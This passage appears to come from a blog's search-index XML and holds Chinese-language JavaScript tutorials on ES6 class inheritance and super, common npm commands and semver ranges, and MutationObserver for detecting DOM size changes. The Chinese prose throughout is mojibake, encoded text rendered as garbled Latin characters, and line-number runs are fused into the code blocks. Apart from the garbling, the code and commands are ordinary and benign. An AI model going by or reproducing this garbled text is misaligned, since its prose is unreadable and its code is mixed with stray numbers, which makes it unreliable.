Error('å¿…é¡»ä½¿ç”¨ new å‘½ä»¤ç”Ÿæˆå®žä¾‹'); &#125;&#125;const person = new Person('joy');const notAPerson = Person.call(person, 'joy'); */// å­ç±»ç»§æ‰¿çˆ¶ç±»æ—¶ï¼Œnew.target ä¼šè¿”å›žå­ç±»class Rectangle &#123; constructor (length, width) &#123; console.log('new.target: ', new.target); &#125;&#125;class Square extends Rectangle &#123; constructor (length) &#123; super(length, length); // è°ƒç”¨çˆ¶ç±»çš„ constructor &#125;&#125;new Square(3) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117// å­ç±»å¿…é¡»åœ¨ constructor æ–¹æ³•ä¸­è°ƒç”¨ super æ–¹æ³•ï¼Œå¦åˆ™æ–°å»ºå®žä¾‹æ—¶ä¼šæŠ¥é”™ã€‚// è¿™æ˜¯å› ä¸ºå­ç±»è‡ªå·±çš„ this å¯¹è±¡ï¼Œå¿…é¡»å…ˆé€šè¿‡çˆ¶ç±»çš„æž„é€ å‡½æ•°å®Œæˆå¡‘é€ ï¼Œå¾—åˆ°ä¸Žçˆ¶ç±»åŒæ ·çš„å®žä¾‹å±žæ€§å’Œæ–¹æ³•// ç„¶åŽå†å¯¹å…¶è¿›è¡ŒåŠ å·¥ï¼ŒåŠ ä¸Šå­ç±»è‡ªå·±çš„å®žä¾‹å±žæ€§å’Œæ–¹æ³•ã€‚// ES5 çš„ç»§æ‰¿ï¼Œå®žè´¨æ˜¯å…ˆåˆ›é€ å­ç±»çš„å®žä¾‹å¯¹è±¡ this ï¼Œç„¶åŽå†å°†çˆ¶ç±»çš„æ–¹æ³•æ·»åŠ åˆ° this ä¸Šé¢ï¼ˆ Parent.apply(this) ï¼‰// ES6 çš„ç»§æ‰¿æœºåˆ¶å®Œå…¨ä¸åŒï¼Œå®žè´¨æ˜¯å…ˆå°†çˆ¶ç±»å®žä¾‹å¯¹è±¡çš„å±žæ€§å’Œæ–¹æ³•ï¼ŒåŠ åˆ° this ä¸Šé¢ï¼ˆæ‰€ä»¥å¿…é¡»å…ˆè°ƒç”¨ super æ–¹æ³•ï¼‰ï¼Œ// ç„¶åŽå†ç”¨å­ç±»çš„æž„é€ å‡½æ•°ä¿®æ”¹ thisã€‚class Point &#123;&#125;class ColorPoint extends Point &#123; constructor (x, y, color) &#123; super(x, y); this.color = color; &#125; toString () &#123; return this.color + ' ' + super.toString(); // è°ƒç”¨çˆ¶ç±»çš„ toString() &#125;&#125;const colorPoint = new ColorPoint(10, 10, 'red');// Object.getPrototypeOf() ä»Žå­ç±»èŽ·å–çˆ¶ç±»console.log('Object.getPrototypeOf(ColorPoint): ', Object.getPrototypeOf(ColorPoint));// super å…³é”®å­—æ—¢å¯ä»¥å½“å‡½æ•°ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥å½“å¯¹è±¡ä½¿ç”¨// super ä½œä¸ºå‡½æ•°ä½¿ç”¨æ—¶ï¼Œä»£è¡¨çˆ¶ç±»æž„é€ å‡½æ•°// super ä½œä¸ºå¯¹è±¡æ—¶ï¼Œåœ¨æ™®é€šæ–¹æ³•ä¸­ï¼ŒæŒ‡å‘çˆ¶ç±»çš„åŽŸåž‹å¯¹è±¡ï¼›åœ¨é™æ€æ–¹æ³•ä¸­ï¼ŒæŒ‡å‘çˆ¶ç±»// super è™½ç„¶ä»£è¡¨äº†çˆ¶ç±»çš„æž„é€ å‡½æ•°ï¼Œä½†æ˜¯è¿”å›žçš„æ˜¯å­ç±»çš„å®žä¾‹ï¼Œå³ super()åœ¨è¿™é‡Œç›¸å½“äºŽ A.prototype.constructor.call(this)// ES6 è§„å®šï¼Œåœ¨å­ç±»æ™®é€šæ–¹æ³•ä¸­é€šè¿‡ super è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•æ—¶ï¼Œæ–¹æ³•å†…éƒ¨çš„ this æŒ‡å‘å½“å‰çš„å­ç±»å®žä¾‹class A &#123; constructor () &#123; this.p = 2; console.log(new.target.name); &#125; print () &#123; console.log(this.x); &#125;&#125;class B extends A &#123; constructor () &#123; super(); this.x = 2; // é€šè¿‡ super å¯¹æŸä¸ªå±žæ€§èµ‹å€¼ï¼Œè¿™æ˜¯ super å°±æ˜¯ this super.x = 3; console.log('super.x: ', super.x); console.log('this.x: ', this.x); &#125; m () &#123; super.print(); // ç”±äºŽ super æŒ‡å‘çˆ¶ç±»çš„åŽŸåž‹å¯¹è±¡ï¼Œæ‰€ä»¥å®šä¹‰åœ¨çˆ¶ç±»å®žä¾‹ä¸Šçš„æ–¹æ³•æˆ–å±žæ€§ï¼Œæ— æ³•é€šè¿‡ super è°ƒç”¨ console.log('super.p: ', super.p); // undefined &#125;&#125;const a = new A();const b = new B();b.m();// super åœ¨é™æ€æ–¹æ³•ä¸­æŒ‡å‘çˆ¶ç±»ï¼Œåœ¨æ™®é€šæ–¹æ³•ä¸­æŒ‡å‘çˆ¶ç±»çš„åŽŸåž‹å¯¹è±¡class Parent &#123; static myMethod (msg) &#123; console.log('static: ', msg); &#125; myMethod (msg) &#123; console.log('instance: ', msg); &#125;&#125;class Child extends Parent &#123; static myMethod (msg) &#123; super.myMethod(msg); &#125; myMethod (msg) &#123; super.myMethod(msg); &#125;&#125;Child.myMethod(1); // static: 1const parent = new Parent();const child = new Child();child.myMethod(2); // static: 2console.log(child);// å­ç±»çš„ __proto__ å±žæ€§ï¼Œè¡¨ç¤ºæž„é€ å‡½æ•°çš„ç»§æ‰¿ï¼Œæ€»æ˜¯æŒ‡å‘çˆ¶ç±»// å­ç±» prototype å±žæ€§çš„ __proto__ å±žæ€§ï¼Œè¡¨ç¤ºæ–¹æ³•çš„ç»§æ‰¿ï¼Œæ€»æ˜¯æŒ‡å‘çˆ¶ç±»çš„ prototype å±žæ€§console.log('Child.__proto__ === Parent: ', Child.__proto__ === Parent);console.log('Child.prototype.__proto__ === Parent.prototype: ', Child.prototype.__proto__ === Parent.prototype);// å­ç±»å®žä¾‹çš„ __proto__ å±žæ€§çš„ __proto__ å±žæ€§ï¼ŒæŒ‡å‘çˆ¶ç±»å®žä¾‹çš„ __proto__ å±žæ€§console.log('child.__proto__.__proto__ === parent.__proto__: ', child.__proto__.__proto__ === parent.__proto__);// ES5 åŽŸç”Ÿæž„é€ å‡½æ•°æ— æ³•ç»§æ‰¿ï¼ŒES6 å…è®¸ç»§æ‰¿åŽŸç”Ÿæž„é€ å‡½æ•°å®šä¹‰å­ç±»class VersionedArray extends Array &#123; constructor () &#123; super(); this.history = [[]]; &#125; commit () &#123; this.history.push(this.slice()); &#125; revert () &#123; this.splice(0, this.length, ...this.history[this.history.length - 1]); &#125;&#125;const v = new VersionedArray();v.push(1);v.push(2);console.log('v: ', v); // [1, 2]v.commit();console.log('history: ', v.history); // [[], [1, 2]]v.push(3);console.log('v: ', v); // [1, 2, 3]console.log('history: ', v.history); // [[], [1, 2]]v.revert();console.log('v: ', v); // [1, 2]]]></content>
  </entry>
  <entry>
    <title><![CDATA[npm-common-cmd]]></title>
    <url>%2F2019%2F08%2F26%2Fnpm-common-cmd%2F</url>
    <content type="text"><![CDATA[npm å¸¸ç”¨å‘½ä»¤å®‰è£…å‘½ä»¤1234567891011121314// å…¨å±€å®‰è£…npm install æ¨¡å—å -g// æœ¬åœ°å®‰è£…npm install æ¨¡å—å// ä¸€æ¬¡å®‰è£…å¤šä¸ªæ¨¡å—npm install æ¨¡å—å1 æ¨¡å—å2 æ¨¡å—å3// å®‰è£…å¼€å‘æ—¶ä¾èµ–åŒ…npm install æ¨¡å—å --save-dev// å®‰è£…è¿è¡Œæ—¶ä¾èµ–åŒ…npm install æ¨¡å—å --save æŸ¥çœ‹å®‰è£…ç›®å½•12345// æŸ¥çœ‹é¡¹ç›®ä¸­æ¨¡å—æ‰€åœ¨ç›®å½•npm root// æŸ¥çœ‹å…¨å±€å®‰è£…æ¨¡å—æ‰€åœ¨ç›®å½•npm root -g æŸ¥çœ‹ npm æ‰€æœ‰å‘½ä»¤1npm help æŸ¥çœ‹æŸä¸ªåŒ…çš„ä¾èµ–åŒ…1npm view æ¨¡å—å dependencies æŸ¥çœ‹åŒ…çš„æºæ–‡ä»¶åœ°å€1npm view æ¨¡å—å repository.url æŸ¥çœ‹å½“å‰æ¨¡å—ä¾èµ–çš„nodeæœ€ä½Žç‰ˆæœ¬å·1npm view æ¨¡å—å engines æŸ¥çœ‹æ¨¡å—å½“å‰ç‰ˆæœ¬å·12345// è¯¥æ¨¡å—åœ¨è¿œç¨‹åº“çš„ç‰ˆæœ¬å·ï¼Œå¹¶ä¸æ˜¯å½“å‰é¡¹ç›®ä¸­æ‰€ä¾èµ–çš„ç‰ˆæœ¬å·npm view æ¨¡å—å version// æŸ¥çœ‹å½“å‰é¡¹ç›®ä¸­åº”ç”¨çš„æŸä¸ªæ¨¡å—ç‰ˆæœ¬å·npm list æ¨¡å—å version æŸ¥çœ‹æ¨¡å—çš„åŽ†å²ç‰ˆæœ¬å’Œå½“å‰ç‰ˆæœ¬1npm view æ¨¡å—å versions æŸ¥çœ‹ä¸€ä¸ªæ¨¡å—çš„æ‰€æœ‰ä¿¡æ¯1npm view æ¨¡å—å æŸ¥çœ‹ npm ä½¿ç”¨çš„æ‰€æœ‰æ–‡ä»¶å¤¹1npm help folders æ›´æ”¹åŒ…å†…å®¹åŽè¿›è¡Œé‡å»º1npm rebuild æ¨¡å—å æ£€æŸ¥åŒ…æ˜¯å¦å·²ç»è¿‡æ—¶1npm outdated æ›´æ–° node æ¨¡å—12345678910npm update æ¨¡å—å// æ›´æ–°åˆ°æŒ‡å®šç‰ˆæœ¬npm update æ¨¡å—å @ç‰ˆæœ¬å·// æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬npm install æ¨¡å—å@latest// å¦‚æžœå½“å‰çš„ç‰ˆæœ¬å·ä¸º2.5.1ï¼Œæ˜¯æ²¡åŠžæ³•è¿›è¡Œnpm update æ¨¡å—å @2.3.1 å°†æ¨¡å—ç‰ˆæœ¬å·å˜ä¸º2.3.1çš„// å½“ç„¶ï¼Œä½ å¯ä»¥å…ˆuninstallï¼Œç„¶åŽè¿›è¡Œinstall @2.3.1 å¸è½½ node æ¨¡å—1npm uninstall æ¨¡å—å è®¿é—® package.json è¯´æ˜Žæ–‡æ¡£1npm help json å‘å¸ƒä¸€ä¸ª npm åŒ…ä¹‹å‰ï¼Œæ£€æŸ¥æŸä¸ªåŒ…æ˜¯å¦å·²ç»å­˜åœ¨1npm search æ¨¡å—å å¼•å¯¼åˆ›å»ºä¸€ä¸ª package.json æ–‡ä»¶1234567npm init// ä¸ç”¨ä¸€æ­¥æ­¥è¾“å…¥ä¿¡æ¯npm init --yes// æˆ–npm init -y æ¸…é™¤ npm ç¼“å­˜1npm cache clean æŸ¥çœ‹ npm çš„ç‰ˆæœ¬1npm -v æŸ¥çœ‹æŸä¸ªæ¨¡å—çš„ bugs åˆ—è¡¨1npm bugs æ¨¡å—å æ‰“å¼€æŸä¸ªæ¨¡å—çš„ä»“åº“ç•Œé¢1npm repo æ¨¡å—å æ‰“å¼€æŸä¸ªæ¨¡å—çš„æ–‡æ¡£1npm home æ¨¡å—å æŸ¥çœ‹å½“å‰å·²ç»å®‰è£…çš„æ¨¡å—1234npm list// æŸ¥çœ‹æ¨¡å—å±‚çº§npm list --depth=0 æ¸…é™¤æœªè¢«ä½¿ç”¨åˆ°çš„æ¨¡å—1npm prune ç‰ˆæœ¬æŽ§åˆ¶åœ¨ package.json ä¸­ï¼Œdependencies å­—æ®µæŒ‡å®šäº†é¡¹ç›®è¿è¡Œæ‰€ä¾èµ–çš„æ¨¡å—ï¼ŒdevDependencies å­—æ®µæŒ‡å®šé¡¹ç›®å¼€å‘æ‰€éœ€è¦çš„æ¨¡å—ã€‚å®ƒä»¬éƒ½æŒ‡å‘ä¸€ä¸ªå¯¹è±¡ã€‚è¯¥å¯¹è±¡çš„å„ä¸ªæˆå‘˜ï¼Œåˆ†åˆ«ç”±æ¨¡å—å’Œå¯¹åº”çš„ç‰ˆæœ¬è¦æ±‚ç»„æˆï¼Œè¡¨ç¤ºä¾èµ–çš„æ¨¡å—åŠç‰ˆæœ¬èŒƒå›´ã€‚ å¯¹åº”çš„ç‰ˆæœ¬å¯ä»¥åŠ ä¸Šå„ç§é™å®šï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š æŒ‡å®šç‰ˆæœ¬ï¼šæ¯”å¦‚ 1.2.2ï¼Œéµå¾ªâ€œå¤§ç‰ˆæœ¬.æ¬¡è¦ç‰ˆæœ¬.å°ç‰ˆæœ¬â€çš„æ ¼å¼è§„å®šï¼Œå®‰è£…æ—¶åªå®‰è£…æŒ‡å®šç‰ˆæœ¬ã€‚ æ³¢æµªå·ï¼ˆtildeï¼‰+æŒ‡å®šç‰ˆæœ¬ï¼šæ¯”å¦‚ ~1.2.2ï¼Œè¡¨ç¤ºå®‰è£… 1.x.x çš„æœ€æ–°ç‰ˆæœ¬ï¼ˆä¸ä½ŽäºŽ 1.2.2ï¼‰ï¼Œä½†æ˜¯ä¸å®‰è£… 1.3.xï¼Œä¹Ÿå°±æ˜¯è¯´å®‰è£…æ—¶ä¸æ”¹å˜å¤§ç‰ˆæœ¬å·å’Œæ¬¡è¦ç‰ˆæœ¬å·ã€‚ æ’å…¥å·ï¼ˆcaretï¼‰+æŒ‡å®šç‰ˆæœ¬ï¼šæ¯”å¦‚ ~1.2.2ï¼Œè¡¨ç¤ºå®‰è£… 1.x.x çš„æœ€æ–°ç‰ˆæœ¬ï¼ˆä¸ä½ŽäºŽ1.2.2ï¼‰ï¼Œä½†æ˜¯ä¸å®‰è£… 2.x.xï¼Œä¹Ÿå°±æ˜¯è¯´å®‰è£…æ—¶ä¸æ”¹å˜å¤§ç‰ˆæœ¬å·ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æžœå¤§ç‰ˆæœ¬å·ä¸º0ï¼Œåˆ™æ’å…¥å·çš„è¡Œä¸ºä¸Žæ³¢æµªå·ç›¸åŒï¼Œè¿™æ˜¯å› ä¸ºæ­¤æ—¶å¤„äºŽå¼€å‘é˜¶æ®µï¼Œå³ä½¿æ˜¯æ¬¡è¦ç‰ˆæœ¬å·å˜åŠ¨ï¼Œä¹Ÿå¯èƒ½å¸¦æ¥ç¨‹åºçš„ä¸å…¼å®¹ã€‚ latestï¼šå®‰è£…æœ€æ–°ç‰ˆæœ¬ã€‚]]></content>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•ä¼˜é›…ç›‘å¬å®¹å™¨é«˜åº¦å˜åŒ–]]></title>
    <url>%2F2019%2F07%2F11%2Fresize-observer%2F</url>
    <content type="text"><![CDATA[å‰è¨€è€é¸Ÿï¼šæ€Žæ ·åŽ»ç›‘å¬ DOM å…ƒç´ çš„é«˜åº¦å˜åŒ–å‘¢ï¼Ÿèœé¸Ÿï¼šå“ˆå“ˆå“ˆå“ˆå“ˆï¼Œè¿™éƒ½ä¸çŸ¥é“å“¦ï¼Œç”¨ onresize äº‹ä»¶é¸­ï¼è€é¸Ÿæ‰¶äº†æ‰¶çœ¼ç›ï¼Œç©ºæ°”å®‰é™å‡ ç§’é’Ÿï¼Œèœé¸Ÿæ‰æ™ƒè¿‡ç¥žæ¥ã€‚å¯¹é¸­ï¼Œæ™®é€š DOM å…ƒç´ æ²¡æœ‰ onresize äº‹ä»¶ï¼Œåªæœ‰åœ¨ window å¯¹è±¡ä¸‹æœ‰æ­¤äº‹ä»¶ï¼Œè¯¥æ­»ï¼ŒåˆåŒå’å•ç³—å¤§äº†ã€‚ å“ˆå“ˆå“ˆå“ˆï¼Œä»¥ä¸Šçº¯å±žè™šæž„ï¼Œä¸è¿‡åœ¨æœ€è¿‘é¡¹ç›®ä¸­è¿˜çœŸé‡åˆ°è¿‡å¯¹å®¹å™¨ç›‘å¬é«˜ï¼ˆå®½ï¼‰å˜åŒ–ï¼šåœ¨ä½¿ç”¨ iscroll æˆ– better-scroll æ»šåŠ¨æ’ä»¶ï¼Œå¦‚æžœå®¹å™¨å†…éƒ¨å…ƒç´ æœ‰é«˜åº¦å˜åŒ–è¦åŽ»åŠæ—¶æ›´æ–°å¤–éƒ¨åŒ…è£¹å®¹å™¨ï¼Œå³è°ƒç”¨ refresh() æ–¹æ³•ã€‚ä¸ç„¶å°±ä¼šé€ æˆæ»šåŠ¨è¯¯å·®ï¼ˆæ»šåŠ¨ä¸åˆ°åº•éƒ¨æˆ–æ»šåŠ¨è„±ç¦»åº•éƒ¨ï¼‰ã€‚ å¯èƒ½æˆ‘ä»¬ä¸€èˆ¬å¤„ç†æ€è·¯ï¼š åœ¨æ¯æ¬¡ DOM èŠ‚ç‚¹æœ‰æ›´æ–°ï¼ˆåˆ é™¤æˆ–æ’å…¥ï¼‰åŽå°±åŽ»è°ƒç”¨ refresh()ï¼Œæ›´æ–°å¤–éƒ¨å®¹å™¨ã€‚ å¯¹å¼‚æ­¥èµ„æºï¼ˆå¦‚å›¾ç‰‡ï¼‰åŠ è½½ï¼Œä½¿ç”¨onload ç›‘å¬æ¯æ¬¡åŠ è½½å®Œæˆï¼Œå†åŽ»è°ƒç”¨ refresh()ï¼Œæ›´æ–°å¤–éƒ¨å®¹å™¨ã€‚ è¿™æ ·æˆ‘ä»¬ä¼šå‘çŽ°ï¼Œå¦‚æžœå®¹å™¨å†…éƒ¨å…ƒç´ æ¯”è¾ƒå¤æ‚ï¼Œè°ƒç”¨ä¼šè¶Šæ¥è¶Šç¹çï¼Œç”šè‡³è¿˜è¦è€ƒè™‘åˆ°ç”¨æˆ·ä½¿ç”¨çš„æ¯ä¸€ä¸ªæ“ä½œéƒ½å¯èƒ½å¯¼è‡´å†…éƒ¨å…ƒç´ å®½é«˜å˜åŒ–ï¼Œè¿›è€Œè¦åŽ»è°ƒæ•´å¤–éƒ¨å®¹å™¨ï¼Œè°ƒç”¨ refresh()ã€‚ å®žé™…ä¸Šï¼Œä¸ç®¡æ˜¯å¯¹å…ƒç´ çš„å“ªç§æ“ä½œï¼Œéƒ½ä¼šé€ æˆå®ƒçš„å±žæ€§ã€å­å­™èŠ‚ç‚¹ã€æ–‡æœ¬èŠ‚ç‚¹å‘ç”Ÿäº†å˜åŒ–ï¼Œå¦‚æžœèƒ½èƒ½ç›‘å¬å¾—åˆ°è¿™ç§å˜åŒ–ï¼Œè¿™æ—¶åªéœ€æ¯”è¾ƒå®¹å™¨å®½é«˜å˜åŒ–ï¼Œå³å¯å®žçŽ°å¯¹å®¹å™¨å®½é«˜çš„ç›‘å¬ï¼Œè€Œæ— éœ€å…³ç³»å®ƒå¤–éƒ¨è¡Œä¸ºã€‚DOM3 Events è§„èŒƒä¸ºæˆ‘ä»¬æä¾›äº† MutationObserver æŽ¥å£ç›‘è§†å¯¹ DOM æ ‘æ‰€åšæ›´æ”¹çš„èƒ½åŠ›ã€‚ MutationObserverMutation Observer API ç”¨æ¥ç›‘è§† DOM å˜åŠ¨ã€‚DOM çš„ä»»ä½•å˜åŠ¨ï¼Œæ¯”å¦‚èŠ‚ç‚¹çš„å¢žå‡ã€å±žæ€§çš„å˜åŠ¨ã€æ–‡æœ¬å†…å®¹çš„å˜åŠ¨ï¼Œè¿™ä¸ª API éƒ½å¯ä»¥å¾—åˆ°é€šçŸ¥ã€‚ PS Mutation Observer API å·²ç»æœ‰å¾ˆä¸é”™çš„æµè§ˆå™¨å…¼å®¹æ€§ï¼Œå¦‚æžœå¯¹IE10åŠä»¥ä¸‹æ²¡æœ‰è¦æ±‚çš„è¯ã€‚ MutationObserver ç‰¹ç‚¹DOM å‘ç”Ÿå˜åŠ¨éƒ½ä¼šè§¦å‘ Mutation Observer äº‹ä»¶ã€‚ä½†æ˜¯ï¼Œå®ƒè·Ÿäº‹ä»¶è¿˜æ˜¯æœ‰ä¸ç”¨ç‚¹ï¼šäº‹ä»¶æ˜¯åŒæ­¥è§¦å‘ï¼ŒDOM å˜åŒ–ç«‹å³è§¦å‘ç›¸åº”äº‹ä»¶ï¼›Mutation Observer æ˜¯å¼‚æ­¥è§¦å‘ï¼ŒDOM å˜åŒ–ä¸ä¼šé©¬ä¸Šè§¦å‘ï¼Œè€Œæ˜¯ç­‰å½“å‰æ‰€æœ‰ DOM æ“ä½œéƒ½ç»“æŸåŽæ‰è§¦å‘ã€‚æ€»çš„æ¥è¯´ï¼Œç‰¹ç‚¹å¦‚ä¸‹ï¼š å®ƒç­‰å¾…æ‰€æœ‰è„šæœ¬ä»»åŠ¡å®ŒæˆåŽï¼Œæ‰ä¼šè¿è¡Œï¼ˆå³å¼‚æ­¥è§¦å‘æ–¹å¼ï¼‰ã€‚ å®ƒæŠŠ DOM å˜åŠ¨è®°å½•å°è£…æˆä¸€ä¸ªæ•°ç»„è¿›è¡Œå¤„ç†ï¼Œè€Œä¸æ˜¯ä¸€æ¡æ¡ä¸ªåˆ«å¤„ç† DOM å˜åŠ¨ã€‚ å®ƒæ—¢å¯ä»¥è§‚å¯Ÿ DOM çš„æ‰€æœ‰ç±»åž‹å˜åŠ¨ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šåªè§‚å¯ŸæŸä¸€ç±»å˜åŠ¨ã€‚ MutationObserver æž„é€ å‡½æ•°MutationObserver æž„é€ å‡½æ•°çš„å®žä¾‹ä¼ çš„æ˜¯ä¸€ä¸ªå›žè°ƒå‡½æ•°ï¼Œè¯¥å‡½æ•°æŽ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å˜åŠ¨çš„æ•°ç»„ï¼Œç¬¬äºŒä¸ªæ˜¯è§‚å¯Ÿå™¨çš„å®žä¾‹ã€‚ 12345var observer = new MutationObserver(function (mutations, observer)&#123; mutations.forEach(function (mutaion) &#123; console.log(mutation); &#125;)&#125;) MutationObserver å®žä¾‹çš„ observe() æ–¹æ³•observe æ–¹æ³•ç”¨æ¥æ‰§è¡Œç›‘å¬ï¼ŒæŽ¥å—ä¸¤ä¸ªå‚æ•°ï¼š ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè¢«è§‚å¯Ÿçš„ DOM èŠ‚ç‚¹ï¼› ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸€ä¸ªé…ç½®å¯¹è±¡ï¼ŒæŒ‡å®šæ‰€è¦è§‚å¯Ÿç‰¹å¾ã€‚ 123456789101112var $tar = document.getElementById('tar');var option = &#123; childList: true, // å­èŠ‚ç‚¹çš„å˜åŠ¨ï¼ˆæ–°å¢žã€åˆ é™¤æˆ–è€…æ›´æ”¹ï¼‰ attributes: true, // å±žæ€§çš„å˜åŠ¨ characterData: true, // èŠ‚ç‚¹å†…å®¹æˆ–èŠ‚ç‚¹æ–‡æœ¬çš„å˜åŠ¨ subtree: true, // æ˜¯å¦å°†è§‚å¯Ÿå™¨åº”ç”¨äºŽè¯¥èŠ‚ç‚¹çš„æ‰€æœ‰åŽä»£èŠ‚ç‚¹ attributeFilter: ['class', 'style'], // è§‚å¯Ÿç‰¹å®šå±žæ€§ attributeOldValue: true, // è§‚å¯Ÿ attributes å˜åŠ¨æ—¶ï¼Œæ˜¯å¦éœ€è¦è®°å½•å˜åŠ¨å‰çš„å±žæ€§å€¼ characterDataOldValue: true // è§‚å¯Ÿ characterData å˜åŠ¨ï¼Œæ˜¯å¦éœ€è¦è®°å½•å˜åŠ¨å‰çš„å€¼&#125;mutationObserver.observe($tar, option); option ä¸­ï¼Œå¿…é¡»æœ‰ childListã€attributeså’ŒcharacterDataä¸­ä¸€ç§æˆ–å¤šç§ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚å…¶ä¸­å„ä¸ªå±žæ€§æ„æ€å¦‚ä¸‹ï¼š childList å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦åº”ç”¨åˆ°å­èŠ‚ç‚¹çš„å˜åŠ¨ï¼ˆæ–°å¢žã€åˆ é™¤æˆ–è€…æ›´æ”¹ï¼‰ï¼› attributes å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦åº”ç”¨åˆ°å±žæ€§çš„å˜åŠ¨ï¼› characterData å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦åº”ç”¨åˆ°èŠ‚ç‚¹å†…å®¹æˆ–èŠ‚ç‚¹æ–‡æœ¬çš„å˜åŠ¨ï¼› subtree å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦åº”ç”¨åˆ°æ˜¯å¦å°†è§‚å¯Ÿå™¨åº”ç”¨äºŽè¯¥èŠ‚ç‚¹çš„æ‰€æœ‰åŽä»£èŠ‚ç‚¹ï¼› attributeFilter æ•°ç»„ï¼Œè¡¨ç¤ºè§‚å¯Ÿç‰¹å®šå±žæ€§ï¼› attributeOldValue å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè§‚å¯Ÿ attributes å˜åŠ¨æ—¶ï¼Œæ˜¯å¦éœ€è¦è®°å½•å˜åŠ¨å‰çš„å±žæ€§å€¼ï¼› characterDataOldValue å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè§‚å¯Ÿ characterData å˜åŠ¨ï¼Œæ˜¯å¦éœ€è¦è®°å½•å˜åŠ¨å‰çš„å€¼ï¼› childList å’Œ subtree å±žæ€§childList å±žæ€§è¡¨ç¤ºæ˜¯å¦åº”ç”¨åˆ°å­èŠ‚ç‚¹çš„å˜åŠ¨ï¼ˆæ–°å¢žã€åˆ é™¤æˆ–è€…æ›´æ”¹ï¼‰ï¼Œç›‘å¬ä¸åˆ°å­èŠ‚ç‚¹åŽä»£èŠ‚ç‚¹å˜åŠ¨ã€‚ 12345678910111213141516171819202122232425262728293031var mutationObserver = new MutationObserver(function (mutations) &#123; console.log(mutations);&#125;)mutationObserver.observe($tar, &#123; childList: true, // å­èŠ‚ç‚¹çš„å˜åŠ¨ï¼ˆæ–°å¢žã€åˆ é™¤æˆ–è€…æ›´æ”¹ï¼‰&#125;)var $div1 = document.createElement('div');$div1.innerText = 'div1';// æ–°å¢žå­èŠ‚ç‚¹$tar.appendChild($div1); // èƒ½ç›‘å¬åˆ°// åˆ é™¤å­èŠ‚ç‚¹$tar.childNodes[0].remove(); // èƒ½ç›‘å¬åˆ°var $div2 = document.createElement('div');$div2.innerText = 'div2';var $div3 = document.createElement('div');$div3.innerText = 'div3';// æ–°å¢žå­èŠ‚ç‚¹$tar.appendChild($div2); // èƒ½ç›‘å¬åˆ°// æ›¿æ¢å­èŠ‚ç‚¹$tar.replaceChild($div3, $div2); // èƒ½ç›‘å¬åˆ°// æ–°å¢žå­™èŠ‚ç‚¹$tar.childNodes[0].appendChild(document.createTextNode('æ–°å¢žå­™æ–‡æœ¬èŠ‚ç‚¹')); // ç›‘å¬ä¸åˆ° attributes å’Œ attributeFilter å±žæ€§attributes å±žæ€§è¡¨ç¤ºæ˜¯å¦åº”ç”¨åˆ° DOM èŠ‚ç‚¹å±žæ€§çš„å€¼å˜åŠ¨çš„ç›‘å¬ã€‚è€Œ attributeFilter å±žæ€§æ˜¯ç”¨æ¥è¿‡æ»¤è¦ç›‘å¬çš„å±žæ€§ keyã€‚ 123456789101112// ...mutationObserver.observe($tar, &#123; attributes: true, // å±žæ€§çš„å˜åŠ¨ attributeFilter: ['class', 'style'], // è§‚å¯Ÿç‰¹å®šå±žæ€§&#125;)// ...// æ”¹å˜ style å±žæ€§$tar.style.height = '100px'; // èƒ½ç›‘å¬åˆ°// æ”¹å˜ className$tar.className = 'tar'; // èƒ½ç›‘å¬åˆ°// æ”¹å˜ dataset$tar.dataset = 'abc'; // ç›‘å¬ä¸åˆ° characterData å’Œ subtree å±žæ€§characterData å±žæ€§è¡¨ç¤ºæ˜¯å¦åº”ç”¨åˆ°èŠ‚ç‚¹å†…å®¹æˆ–èŠ‚ç‚¹æ–‡æœ¬çš„å˜åŠ¨ã€‚subtree æ˜¯å¦å°†è§‚å¯Ÿå™¨åº”ç”¨äºŽè¯¥èŠ‚ç‚¹çš„æ‰€æœ‰åŽä»£èŠ‚ç‚¹ã€‚ä¸ºäº†æ›´å¥½è§‚å¯ŸèŠ‚ç‚¹æ–‡æœ¬å˜åŒ–ï¼Œå°†ä¸¤è€…ç»“åˆåº”ç”¨åˆ°å¯Œæ–‡æœ¬ç›‘å¬ä¸Šæ˜¯ä¸é”™çš„é€‰æ‹©ã€‚ ç®€å•çš„å¯Œæ–‡æœ¬ï¼Œæ¯”å¦‚ 1&lt;div id="tar" contentEditable&gt;A simple editor&lt;/div&gt; 123456789var $tar = document.getElementById('tar');var MutationObserver = window.MutationObserver || window.webkitMutationObserver || window.MozMutationObserver;var mutationObserver = new MutationObserver(function (mutations) &#123; console.log(mutations);&#125;)mutationObserver.observe($tar, &#123; characterData: true, // èŠ‚ç‚¹å†…å®¹æˆ–èŠ‚ç‚¹æ–‡æœ¬çš„å˜åŠ¨ subtree: true, // æ˜¯å¦å°†è§‚å¯Ÿå™¨åº”ç”¨äºŽè¯¥èŠ‚ç‚¹çš„æ‰€æœ‰åŽä»£èŠ‚ç‚¹&#125;) takeRecords()ã€disconnect() æ–¹æ³•MutationObserver å®žä¾‹ä¸Šè¿˜æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼ŒtakeRecords() ç”¨æ¥æ¸…ç©ºè®°å½•é˜Ÿåˆ—å¹¶è¿”å›žå˜åŠ¨è®°å½•çš„æ•°ç»„ã€‚disconnect() ç”¨æ¥åœæ­¢è§‚å¯Ÿã€‚è°ƒç”¨è¯¥æ–¹æ³•åŽï¼ŒDOM 